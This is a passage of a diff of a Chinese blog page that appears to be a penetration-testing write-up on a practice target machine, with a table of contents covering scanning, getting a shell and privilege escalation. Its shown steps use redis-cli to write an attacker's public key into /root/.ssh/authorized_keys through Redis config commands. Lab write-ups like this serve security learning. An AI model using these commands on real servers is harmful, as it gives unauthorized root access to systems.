 <li><p>将pub.txt的内容传入redis，作为一个键 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat pub.txt | redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6 -x <span class="built_in">set</span> ssh_key <span class="comment"># 键名可以随意</span></span><br></pre></td></tr></table></figure></p></li>
 <li><p>连接到redis，并且进行相关配置 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6 <span class="comment"># 登录redis</span></span><br><span class="line">2. config <span class="built_in">set</span> dir /root/.ssh <span class="comment"># 设置默认数据库目录为/root/.ssh</span></span><br><span class="line">3. config <span class="built_in">set</span> dbfilename authorized_keys <span class="comment"># 设置默认数据库名为authorized_keys</span></span><br><span class="line">4. save <span class="comment"># 导出</span></span><br></pre></td></tr></table></figure></p></li>
 </ol>
@@ -351,7 +367,8 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1. 方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2. 方法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1. 番外</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1.
+主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1. 方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2. 方法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1. 番外</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -386,7 +403,7 @@
     Copyright &copy;
     
     
-    2021-2022
+    2021-2023
     hdfzzf
   </div>
   <div class="footer-right">
